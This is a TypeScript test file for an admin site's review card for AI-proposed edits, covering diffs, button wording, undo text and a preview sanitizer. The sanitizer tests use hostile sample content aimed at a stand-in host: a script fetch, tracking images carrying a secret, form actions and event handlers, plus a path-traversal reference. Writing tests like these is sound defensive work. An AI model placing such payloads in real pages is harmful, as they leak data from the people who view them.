/**
 * M3 — the change card's pure parts (design §5.3, §8.2; stage M3b): the
 * diff model the card and the review sheet share, the truncation that keeps
 * Approve off until a long change was read to its end, the words of every
 * kind (never a bare "Approve"), the undo line before the click, and the
 * Preview tab's tree, made inert on the server so rendering it loads and
 * follows nothing. The browser half is e2e/ai-admin.spec.ts.
 */
import { test } from 'node:test'
import assert from 'node:assert/strict'
import fs from 'node:fs'
import path from 'node:path'
import { ROOT, reachable, rel } from './helpers/importGraph'
import { CARD_CHANGED_LIMIT, CARD_VALUE_CHARS, changeDiff, compactDiff, effectLine, fullLineDiff, heldOf, historyLinks, kindCopy, livePaths, momentOf, scheduleOf, titleParts, undoLines } from '../components/Admin/ai/changeFormat'
import { AI_COPY, CHANGES_COPY, CHANGE_AREA_COPY, CHANGE_KIND_COPY, CHANGE_STATE_COPY, LINK_FLAG_COPY } from '../components/Admin/ai/copy'
import type { ChangePreview, PreviewDocument } from '../components/Admin/ai/types'
import { bodyOfDocumentText, inertPreviewTree, isSitePath } from '../lib/ai/previewTree'

const read = (file: string) => fs.readFileSync(path.join(ROOT, file), 'utf8')

const mdx = (before: string, after: string, extra: Partial<PreviewDocument> = {}): PreviewDocument => ({ ref: 'blog/x', label: 'Post x', publicUrl: '/blog/x', format: 'mdx', before, after, ...extra })
const json = (before: unknown, after: unknown, extra: Partial<PreviewDocument> = {}): PreviewDocument => ({
  ref: 'home',
  label: 'Home page as visitors see it',
  publicUrl: '/',
  format: 'json',
  before: before === undefined ? '' : JSON.stringify(before, null, 2),
  after: after === undefined ? '' : JSON.stringify(after, null, 2),
  ...extra,
})
const lines = (n: number, word = 'line') => Array.from({ length: n }, (_, i) => `${word} ${i + 1}`).join('\n')
const preview = (kind: string, documents: PreviewDocument[], effects: Partial<ChangePreview['effects']> = {}): ChangePreview => ({
  kind,
  risk: 'live',
  title: 'T',
  documents,
  newLinks: [],
  newEmbeds: [],
  zeroWidth: 0,
  effects: { publicPaths: [], schedule: null, deleted: false, import: null, hiddenValuesChanged: null, ...effects },
})

test('a change longer than the card can show is truncated: the first 12 changed lines, the rest only in the sheet', () => {
  const long = changeDiff({ documents: [mdx('', lines(20))] })
  assert.equal(long.changed, 20)
  assert.equal(long.unit, 'lines')
  const card = compactDiff(long)
  assert.equal(card.shown, CARD_CHANGED_LIMIT)
  assert.equal(card.truncated, true, 'Approve waits for the sheet')
  const shownChanged = card.docs.flatMap((d) => (d.format === 'mdx' ? d.lines.filter((l) => l.kind !== 'same') : []))
  assert.deepEqual(shownChanged.map((l) => l.text), lines(12).split('\n'), 'the first twelve, in order')
  // Exactly twelve fits: nothing left over, nothing to read first.
  assert.equal(compactDiff(changeDiff({ documents: [mdx(lines(30), lines(30).replace(/line (\d+)$/gm, (m, n) => (Number(n) <= 6 ? `line ${n} edited` : m)))] })).truncated, false)
  // Over several documents the limit counts across them; the documents after it are left to the sheet.
  const multi = changeDiff({ documents: [mdx('', lines(8)), mdx('', lines(8), { ref: 'blog/y' }), mdx('', lines(3), { ref: 'blog/z' })] })
  const cut = compactDiff(multi)
  assert.equal(cut.shown, 12)
  assert.deepEqual(cut.docs.map((d) => d.doc.ref), ['blog/x', 'blog/y'])
  assert.equal(cut.truncated, true)
})

test('a JSON value too long for the card is shortened there and makes the card truncated; the sheet keeps it whole', () => {
  const long = 'x'.repeat(CARD_VALUE_CHARS + 50)
  const d = changeDiff({ documents: [json({ hero: { tagline: 'Old' } }, { hero: { tagline: long } })] })
  assert.equal(d.unit, 'values')
  assert.equal(d.changed, 1)
  assert.equal(d.docs[0].format === 'json' && d.docs[0].entries[0].after, long, 'the diff itself is whole')
  const card = compactDiff(d)
  assert.equal(card.shown, 1)
  assert.equal(card.truncated, true, 'a value the card cuts must be read in the sheet')
  assert.equal(card.docs[0].format === 'json' && card.docs[0].entries[0].shortened, true)
  // A short value is shown whole and does not hold Approve back.
  assert.equal(compactDiff(changeDiff({ documents: [json({ a: 'b' }, { a: 'c' })] })).truncated, false)
  // A document that appears or disappears is one value; mixed formats count as changes.
  assert.equal(changeDiff({ documents: [json({ name: 'img.webp' }, undefined)] }).docs[0].format === 'json' && changeDiff({ documents: [json({ name: 'img.webp' }, undefined)] }).changed, 1)
  assert.equal(changeDiff({ documents: [mdx('a', 'b'), json({ a: 1 }, { a: 2 })] }).unit, 'changes')
})

test('a diff too large for the browser’s table still shows every line: the common start and end, then all removed and all added', () => {
  const before = Array.from({ length: 5200 }, (_, i) => `row ${i}`).join('\n')
  const after = before.replace('row 10\n', 'row ten\n').replace('row 5100\n', 'row five thousand one hundred\n')
  const out = fullLineDiff(before, after)
  const old = out.filter((l) => l.kind !== 'add').map((l) => l.text)
  const neu = out.filter((l) => l.kind !== 'del').map((l) => l.text)
  assert.deepEqual(old, before.split('\n'), 'every line before, in order')
  assert.deepEqual(neu, after.split('\n'), 'every line after, in order')
  assert.ok(out.some((l) => l.kind === 'add' && l.text === 'row ten'))
  assert.ok(out.slice(0, 10).every((l) => l.kind === 'same'), 'the common start is unchanged')
})

test('every kind names its effect on the Approve button, never a bare “Approve”; destructive kinds say why they ask for a sign-in', () => {
  const kinds = [
    'item.publish', 'item.unpublish', 'item.schedule', 'item.unschedule', 'item.discard-changes', 'item.edit-held', 'item.restore', 'item.delete',
    'page.edit', 'page.restore', 'home.edit', 'home.restore', 'cv.edit', 'cv.restore', 'tag.change', 'health.fix', 'media.apply-alt', 'media.import',
    'media.trash', 'item.create', 'item.edit-draft', 'item.edit-pending', 'media.texts',
  ]
  assert.deepEqual(Object.keys(CHANGE_KIND_COPY).sort(), [...kinds].sort(), 'one entry per kind a change can have')
  for (const k of kinds) {
    assert.match(kindCopy(k).approve, /^Approve & \S/, k)
    assert.ok(kindCopy(k).done.length > 3, k)
  }
  assert.equal(kindCopy('item.publish').approve, 'Approve & publish')
  assert.equal(kindCopy('item.delete').approve, 'Approve & delete')
  assert.equal(kindCopy('cv.restore').approve, 'Approve & restore')
  assert.equal(kindCopy('something.new').approve, 'Approve & apply', 'an unknown kind still names an effect')
  assert.equal(CHANGES_COPY.stepUp('item.delete', 'old-post'), 'Deleting “old-post” takes it off the site.')
  assert.match(CHANGES_COPY.stepUp('item.unpublish', 'x'), /takes it off the site/)
  assert.match(CHANGES_COPY.stepUp('item.restore', 'x'), /replaces what visitors see/)
  assert.match(CHANGES_COPY.stepUp('media.trash', 'a.webp'), /every page that uses it/)
  assert.equal(CHANGES_COPY.readFirst(214, 'lines'), 'Read all 214 changed lines first')
})

test('the undo line is honest before the click: one click while unchanged, what it can’t reach, and no single undo for many documents', () => {
  assert.deepEqual(undoLines('item.publish'), { line: 'Undo: one click, until it changes again.', fetched: true, multi: false })
  assert.equal(undoLines('item.edit-held').fetched, false, 'a held edit reaches no reader at approval')
  assert.equal(undoLines('item.schedule').fetched, false)
  for (const k of ['tag.change', 'health.fix', 'media.apply-alt']) assert.deepEqual(undoLines(k), { line: 'No single undo: each document has its own history.', fetched: true, multi: true }, k)
  assert.match(undoLines('media.trash').line, /trash \(30 days\)/)
  assert.match(undoLines('media.import').line, /used nowhere/)
  assert.equal(CHANGES_COPY.undoLine.fetched, 'Undo restores the site, not what readers, feeds, IndexNow or crawlers already fetched.')
  // "No single undo" lists where each document keeps its history: admin pages only, once each.
  const docs = [mdx('a', 'b', { ref: 'blog/one' }), mdx('a', 'b', { ref: 'blog/one#pending' }), mdx('a', 'b', { ref: 'work/two' }), mdx('a', 'b', { ref: 'page/about-zh' }), json(1, 2, { ref: 'cv' }), json(1, 2, { ref: 'media/x y.webp' }), mdx('a', 'b', { ref: 'page/../../api/admin/draft' })]
  assert.deepEqual(historyLinks({ documents: docs }), [
    { label: 'blog/one', href: '/admin/blog/edit?slug=one' },
    { label: 'work/two', href: '/admin/work/edit?slug=two' },
    { label: 'page/about-zh', href: '/admin/about?lang=zh' },
    { label: 'CV', href: '/admin/dashboard?tab=versions' },
    { label: 'media/x y.webp', href: '/admin/media?open=x%20y.webp' },
  ])
})

test('the headline sets a slug, an image or a page address in mono and nothing else; the effect line comes from the preview’s effects', () => {
  assert.deepEqual(titleParts('Publish post swcs-notes', { kind: 'blog', ref: 'swcs-notes' }), ['Publish post ', 'swcs-notes', ''])
  assert.deepEqual(titleParts('Edit /now', { kind: 'page', ref: 'now' }), ['Edit ', '/now', ''])
  assert.deepEqual(titleParts('Edit the home page', { kind: 'home', ref: 'home' }), ['Edit the home page', '', ''], 'the home page has no name to set apart')
  assert.deepEqual(titleParts('Move image a.webp to the trash', { kind: 'media', ref: 'a.webp' }), ['Move image ', 'a.webp', ' to the trash'])
  const pub = preview('item.publish', [mdx('', 'title: X\n---\nBody')], { publicPaths: ['/blog/x', '/blog', '/'] })
  assert.equal(effectLine(pub), 'Goes live at /blog/x and refreshes 2 other pages.')
  assert.equal(effectLine(preview('item.delete', [mdx('a', '')], { publicPaths: [] })), 'Deletes the draft. Visitors never saw it.')
  assert.match(effectLine(preview('media.import', [], { import: { url: 'https://images.example.com/a.png', host: 'images.example.com' } })), /from images\.example\.com into the uploads/)
  assert.equal(effectLine(preview('tag.change', [mdx('a', 'b'), mdx('c', 'd')])), 'Changes the tags of 2 documents and refreshes the pages that list them.')
  assert.equal(effectLine(preview('home.edit', [json({ a: 1 }, { a: 2 })], { publicPaths: ['/', '/about', '/zh'] })), 'Changes the home page at once and refreshes 2 other pages.')
  assert.equal(effectLine(preview('cv.restore', [json({ a: 1 }, { a: 2 }, { publicUrl: '/cv' })])), 'Replaces the CV with the version it names.')
  assert.equal(effectLine(preview('page.restore', [mdx('a', 'b', { publicUrl: '/now' })])), 'Replaces what visitors see at /now with the version it names.')
})

test('a moment stored as milliseconds is put in words beside the number; anything else is left alone', () => {
  const at = Date.UTC(2026, 10, 7, 12, 52)
  assert.ok(momentOf('availability.updatedAt', at), 'an …At key with a time of this century')
  assert.ok(momentOf('items[2].publishedAt', at))
  assert.equal(momentOf('availability.updatedAt', 42), null, 'too small to be a moment')
  assert.equal(momentOf('stats.downloads', at), null, 'not an …At key')
  assert.equal(momentOf('availability.updatedAt', String(at)), null, 'text stays text')
})

test('schedules and held reasons are read from the preview the server hashed', () => {
  const held = preview('item.edit-held', [], { schedule: { held: 'scheduled', publish_at: '2026-12-01T09:00:00.000Z' } })
  assert.deepEqual(heldOf(held), { held: 'scheduled', publish_at: '2026-12-01T09:00:00.000Z' })
  assert.equal(scheduleOf(held), null, 'a held reason is not a schedule the change sets')
  assert.deepEqual(heldOf(preview('item.edit-held', [], { schedule: { held: 'review_link', active_links: 2 } })), { held: 'review_link', active_links: 2 })
  const set = preview('item.schedule', [], { schedule: { before: { publish_at: null, unpublish_at: null }, after: { publish_at: '2026-12-01T09:00:00.000Z', unpublish_at: null } } })
  assert.deepEqual(scheduleOf(set), { publishAt: '2026-12-01T09:00:00.000Z', unpublishAt: null, cleared: false })
  const cleared = preview('item.unschedule', [], { schedule: { before: { publish_at: '2026-12-01T09:00:00.000Z', unpublish_at: null }, after: { publish_at: null, unpublish_at: null } } })
  assert.equal(scheduleOf(cleared)?.cleared, true)
  assert.equal(scheduleOf(preview('item.publish', [], { schedule: { before: { publish_at: null, unpublish_at: null }, after: { publish_at: null, unpublish_at: null } } })), null, 'no schedule moved: no line')
  // Live now lists only paths on this site.
  assert.deepEqual(livePaths({ result: { publicUrls: ['/blog/x', '//evil.example/x', 'https://evil.example/', '/'] } }), ['/blog/x', '/'])
})

test('the words keep the admin’s voice: no exclamation marks, curly quotes; every state, area and link flag has words', () => {
  const strings: string[] = []
  const walk = (v: unknown) => {
    if (typeof v === 'string') strings.push(v)
    else if (typeof v === 'function') {
      for (const args of [[2, 'lines'], ['item.delete', 'x'], ['Laptop', 'Publish post x']]) {
        const out = (v as (...a: unknown[]) => unknown)(...args)
        if (typeof out === 'string') strings.push(out)
      }
    } else if (v && typeof v === 'object') Object.values(v).forEach(walk)
  }
  for (const c of [CHANGES_COPY, CHANGE_KIND_COPY, CHANGE_STATE_COPY, CHANGE_AREA_COPY, LINK_FLAG_COPY, AI_COPY.tabs, AI_COPY.strip]) walk(c)
  assert.ok(strings.length > 120)
  for (const s of strings) {
    assert.doesNotMatch(s, /!(?!=)/, s)
    assert.doesNotMatch(s, /(^|\s)"|"(\s|$|[.,])/, `straight double quotes: ${s}`)
    assert.doesNotMatch(s, /\bAI did\b/i, `never “AI did X” for an action the owner approved: ${s}`)
  }
  for (const state of ['waiting', 'applying', 'applied', 'rejected', 'expired', 'conflict', 'failed', 'undone', 'voided', 'in_editor']) assert.ok(CHANGE_STATE_COPY[state as keyof typeof CHANGE_STATE_COPY], state)
  for (const flag of ['not-https', 'credentials', 'ip-address', 'query', 'fragment', 'random-path']) assert.ok(LINK_FLAG_COPY[flag], flag)
  for (const area of ['blog', 'work', 'page', 'home', 'cv', 'media', 'tags', 'health']) assert.ok(CHANGE_AREA_COPY[area], area)
  assert.equal(CHANGES_COPY.state.conflict, 'This changed after it was proposed.')
  assert.equal(CHANGES_COPY.state.expired, 'This proposal expired. Ask again if you still want it.')
  assert.equal(CHANGES_COPY.rejectNote, 'Tell it why (optional)')
  assert.equal(CHANGES_COPY.modelSays, 'The model says:')
})

// ── The Preview tab's tree (lib/ai/previewTree) ──────────────────────────────

const el = (tagName: string, properties: Record<string, unknown> = {}, children: unknown[] = []) => ({ type: 'element', tagName, properties, children })
const txt = (value: string) => ({ type: 'text', value })

test('a hostile compiled tree comes out inert: remote images, players, frames, scripts, forms and links replaced; handlers and loading styles dropped', () => {
  const hostile = {
    type: 'root',
    children: [
      el('p', { onClick: 'steal()', style: 'background:url(https://collector.example/p.gif)' }, [txt('Hello '), el('a', { href: '/api/admin/draft?x=1' }, [txt('a same-site link')])]),
      el('img', { src: 'https://collector.example/x.png?d=secret', alt: 'remote' }),
      el('img', { src: '/uploads/local.webp', srcSet: '/uploads/local.w640.webp 640w, https://collector.example/y.webp 1280w', alt: 'mixed' }),
      el('img', { src: '/uploads/ok.webp', srcSet: '/uploads/ok.w640.webp 640w', alt: 'local', onError: 'x()' }),
      el('img', { src: '//collector.example/protocol-relative.png' }),
      el('img', { src: '/\\collector.example/backslash.png' }),
      el('iframe', { src: 'https://www.youtube-nocookie.com/embed/abc' }),
      el('youtube-embed', { dataId: 'abc' }),
      el('video', { poster: 'https://collector.example/poster.jpg' }, [el('source', { src: 'https://collector.example/v.mp4' })]),
      el('script', {}, [txt('fetch("https://collector.example")')]),
      el('style', {}, [txt('@import url(https://collector.example/s.css)')]),
      el('form', { action: 'https://collector.example/f' }, [el('input', { name: 'q' })]),
      el('svg', {}, [el('image', { href: 'https://collector.example/i.svg' })]),
      el('div', { className: ['callout'], style: '--shiki-light:#000' }, [el('figure', {}, [el('img', { src: 'https://cdn.example.com/fig.png' })]), el('a', { href: 'https://example.com/out' }, [txt('out')])]),
      { type: 'raw', value: '<img src="https://collector.example/raw.png">' },
      { type: 'comment', value: 'x' },
    ],
  }
  const { tree, replaced } = inertPreviewTree(hostile)
  const out = JSON.stringify(tree)
  assert.doesNotMatch(out, /"src":"(?!\/uploads\/)/, 'no image source off this site')
  assert.doesNotMatch(out, /"(poster|href|action|data|xlinkHref)":/, 'no address-bearing attribute survives')
  const srcsets = Array.from(out.matchAll(/"src[sS]et":"([^"]*)"/g), (m) => m[1])
  assert.ok(srcsets.length > 0 && srcsets.every((v) => v.split(',').every((c) => c.trim().startsWith('/uploads/'))), 'a srcset survives only with every candidate on this site')
  assert.doesNotMatch(out, /"on[A-Z]/, 'no handler survives')
  assert.doesNotMatch(out, /url\(/, 'no loading style survives')
  assert.doesNotMatch(out, /"tagName":"(a|iframe|youtube-embed|video|source|script|style|form|input|svg|image)"/)
  assert.doesNotMatch(out, /"type":"(raw|comment)"/)
  // What a reader needs stays: the text, the local image, the harmless style, the class.
  assert.match(out, /Hello /)
  assert.match(out, /"src":"\/uploads\/ok\.webp"/)
  assert.match(out, /"srcSet":"\/uploads\/ok\.w640\.webp 640w"/)
  assert.match(out, /"style":"--shiki-light:#000"/)
  // Placeholders carry the address as text; links read as text with the address in a title.
  assert.match(out, /\[image not loaded\] https:\/\/collector\.example\/x\.png\?d=secret/)
  assert.match(out, /\[image not loaded\] \/uploads\/local\.webp/, 'one remote candidate is enough to replace the image')
  assert.match(out, /\[player not loaded\] https:\/\/www\.youtube-nocookie\.com\/embed\/abc/)
  assert.match(out, /"className":\["ai-preview-link"\],"title":"\/api\/admin\/draft\?x=1"/)
  assert.equal(replaced.links, 2)
  assert.equal(replaced.images, 5)
  assert.ok(replaced.embeds >= 7)
  // The input is untouched.
  assert.equal((hostile.children[1] as unknown as { properties: { src: string } }).properties.src, 'https://collector.example/x.png?d=secret')
})

test('a site path is one leading slash; the preview body is what follows the frontmatter lines', () => {
  for (const ok of ['/uploads/a.webp', '/blog/x']) assert.equal(isSitePath(ok), true, ok)
  for (const bad of ['//evil.example/a', '/\\evil.example', 'https://example.com/a', 'uploads/a', '/a\u0000b', '', null]) assert.equal(isSitePath(bad), false, String(bad))
  assert.equal(bodyOfDocumentText('title: X\ndescription: "a\\n---"\n---\n## Body\n\n---\n\nAfter a rule'), '## Body\n\n---\n\nAfter a rule')
  assert.equal(inertPreviewTree(null).tree.children.length, 0)
})

// ── Where the change UI lives ────────────────────────────────────────────────

test('the change UI loads with its pages: dynamic() panels and card, and none of it reaches the server’s AI layer', () => {
  const page = read('pages/admin/ai.tsx')
  assert.match(page, /dynamic\(\(\) => import\('\.\.\/\.\.\/components\/Admin\/ai\/ChangesPanel'\), \{\s*ssr: false/)
  const review = read('pages/admin/ai/change/[id].tsx')
  assert.match(review, /dynamic\(\(\) => import\('\.\.\/\.\.\/\.\.\/\.\.\/components\/Admin\/ai\/ChangeCard'\), \{\s*ssr: false/)
  assert.match(read('components/Admin/ai/ChangeReviewSheet.tsx'), /dynamic\(\(\) => import\('\.\/ChangePreviewPane'\)/, 'the article renderer loads with the Preview tab only')
  const graph = reachable(['pages/admin/ai.tsx', 'pages/admin/ai/change/[id].tsx', 'components/Admin/ai/ChangesPanel.tsx', 'components/Admin/ai/ChangeCard.tsx'].map((f) => rel(path.join(ROOT, f))))
  const server = Array.from(graph.entries()).filter(([f]) => /^lib\/(ai|mcp)\//.test(f)).map(([, chain]) => chain.join(' -> '))
  assert.deepEqual(server, [], 'client code reaches server modules')
  // The review link's bounce lands on this page; the page loads the change behind the session only.
  assert.match(read('pages/api/oauth/open.ts'), /bounceHtml\(`\/admin\/ai\/change\/\$\{id\}`/)
  assert.match(review, /fetch\(`\/api\/admin\/ai\/changes\/\$\{id\}`/)
  assert.match(review, /loginHref\(`\/admin\/ai\/change\/\$\{id\}`\)/)
})

test('a destructive approval goes through fetchWithStepUp; the card never takes the focus; A and R act only inside it', () => {
  const card = read('components/Admin/ai/ChangeCard.tsx')
  assert.match(card, /stepUpReason \? fetchWithStepUp\(url, init, stepUpReason\) : fetch\(url, init\)/)
  assert.match(card, /destructive \? CHANGES_COPY\.stepUp\(change\.kind, change\.target\.ref\) : undefined/)
  assert.match(card, /preview_sha256: change\.preview_sha256/, 'the POST carries the hash the card was loaded with')
  assert.doesNotMatch(card, /autoFocus|\.focus\(\)\s*$/m)
  assert.match(card, /useArmedAction<HTMLDivElement>\(waiting && !!preview\)/)
  assert.match(card, /getShortcutsEnabled\(\) \|\| isTextEntryTarget\(e\.target\)/)
  // The one place the card moves the focus is the reject field the owner asked for.
  assert.equal((card.match(/\.focus\(\)/g) || []).length, 1)
  assert.match(card, /requestAnimationFrame\(\(\) => noteRef\.current\?\.focus\(\)\)/)
  const sheet = read('components/Admin/ai/ChangeReviewSheet.tsx')
  assert.match(sheet, /new IntersectionObserver\(/)
  assert.match(sheet, /isDisabled=\{!read \|\| !armed \|\| approve\.blocked\}/)
})
